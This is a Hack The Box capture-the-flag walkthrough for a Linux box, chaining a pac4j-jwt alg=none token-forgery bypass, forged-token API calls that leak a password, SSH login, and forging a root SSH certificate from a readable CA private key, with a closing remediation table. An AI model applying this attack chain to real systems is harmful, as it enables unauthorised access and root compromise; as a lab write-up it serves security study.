<div align="center">

# 🔐 HTB: Principal

![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=flat-square&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)
![Cert](https://img.shields.io/badge/Track-CPTS-blue?style=flat-square)

`hackthebox` `linux` `jwt` `cve-2026-29000` `pac4j` `ssh-certificate-auth`

</div>

---

> **TL;DR** — A JWT/JWE auth library (pac4j) has a public JWKS endpoint and a known bypass that lets you forge an admin token signed with `alg=none`. That token unlocks an internal API which leaks an SSH signing key. Forge your own certificate off that CA, and you're root.

## 📋 Box Info

| | |
|---|---|
| 🖥️ **OS** | Linux |
| 🎯 **Target** | `<TARGET_IP>` |
| 🎚️ **Difficulty** | Medium |
| 📅 **Date** | March 27, 2026 |
| 🏁 **Outcome** | ✅ Full compromise |

## 🔍 Recon

```bash
nmap -sVC -p- <TARGET_IP> -T3 --min-rate 5000
```

| Port | Service | Notes |
|:---:|---|---|
| `22` | ssh | OpenSSH 9.6p1 (Ubuntu) |
| `8080` | http | Jetty, "Principal Internal Platform - Login" |

The login page redirects to `/login`, and the response headers immediately give away the stack:

```
X-Powered-By: pac4j-jwt/6.0.3
```

**pac4j** is a Java security/auth engine. Version 6.0.3 rang a bell — worth checking for known bugs before touching anything else.

---

## 🚩 Foothold — Forged Admin Token

### The stack, mapped out

Pulling the client JS bundle from `/login` reveals the shape of the auth flow:

- `POST /api/auth/login` → returns `data.token`
- Token format: **JWE** (`RSA-OAEP-256` + `A128GCM`) wrapping an inner **JWT** signed `RS256`
- Public keys exposed at `GET /api/auth/jwks`
- API surface: `/api/dashboard`, `/api/users`, `/api/settings`
- Roles: `ROLE_ADMIN`, `ROLE_MANAGER`, `ROLE_USER`

> 💡 **Why the JWKS endpoint matters:** it's meant to expose the *encryption* public key so clients can wrap requests — not to hand an attacker a target for forgery. But combined with a signature-validation bug, it becomes exactly that.

```bash
GET /api/auth/jwks
```

```json
{
  "keys": [{ "kid": "enc-key-1", "kty": "RSA", "e": "AQAB", "n": "<modulus>" }]
}
```

### CVE-2026-29000 — pac4j-jwt 6.0.3 verification bypass

pac4j-jwt 6.0.3 has a bug that lets an attacker present an **unsigned** (`alg=none`) inner JWT wrapped in a validly-encrypted JWE, and have it accepted as authentic. In other words: encrypt correctly, sign not at all.

```bash
python3 pac4j-exploit.py -u http://<TARGET_IP>:8080
```

The exploit:
1. Fetches `/api/auth/jwks`, grabs the RSA public key (`kid: enc-key-1`)
2. Forges a JWE containing an **unsigned** inner JWT with claims: `sub=admin`, `role=ROLE_ADMIN`, `iss=principal-platform`
3. Confirms access: `GET /api/dashboard` → `200 OK`, full platform stats

Dashboard activity logs immediately hint at the next step — `CERT_ISSUED` events for `svc-deploy` referencing SSH certificate issuance.

### Pulling the user directory and app secrets

```bash
curl -s http://<TARGET_IP>:8080/api/users -H "Authorization: Bearer <forged_token>"
```

Eight accounts total. Two stand out:
- `admin` — `ROLE_ADMIN`, IT Security
- `svc-deploy` — deployer role, *"Service account for automated deployments via SSH certificate auth"*

```bash
curl -s http://<TARGET_IP>:8080/api/settings -H "Authorization: Bearer <forged_token>"
```

The settings API dumps the full security config, including:

```
encryptionKey: D3pl0y_$$H_Now42!
SSH certificate auth: enabled
SSH CA path: /opt/principal/ssh/
```

That's not just an app secret — it doubles as `svc-deploy`'s SSH password.

```bash
ssh svc-deploy@<TARGET_IP>
# password: D3pl0y_$$H_Now42!
```

```
svc-deploy@principal:~$ cat user.txt
<USER_FLAG_REDACTED>
```

---

## 👑 Root — Forging an SSH Certificate

### The CA key is sitting right there

```bash
svc-deploy@principal:~$ cat /opt/principal/ssh/*
```

That directory holds the **SSH User CA private key** — the same CA the settings API told us to look for. This key is what the server uses to sign valid user certificates. Whoever holds it can mint a certificate for *any* principal, including `root`.

> ⚠️ **Root cause:** an SSH CA private key lives in a directory readable by a service account that was reachable via a forged auth token. Certificate-based SSH auth is only as strong as the CA key's custody.

### Sign your own root certificate

```bash
ssh-keygen -t rsa -b 4096 -f root_key -N "" -C "root@principal"
ssh-keygen -s ca_key -I "root-cert" -n root -V +1h -z 1 root_key.pub
```

That produces `root_key-cert.pub` — a certificate for principal `root`, signed by the real CA, valid for one hour.

```bash
ssh -i root_key root@localhost
```

```
root@principal:~# cat root.txt
<ROOT_FLAG_REDACTED>
```

---

## 🛠️ Remediation

| Weakness | Fix |
|---|---|
| pac4j-jwt 6.0.3 signature bypass | Upgrade to a patched pac4j release; never trust `alg=none` on the receiving end. |
| Settings API exposing `encryptionKey` to any authenticated (or forged) session | Scope config endpoints to true admins only; never return secrets meant for internal service auth over a general API. |
| SSH CA private key readable by a low-privilege service account | Store CA key material on a hardened signing host, not on the app server; restrict filesystem permissions to the signing service only. |

---

<div align="center">

*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*

</div>
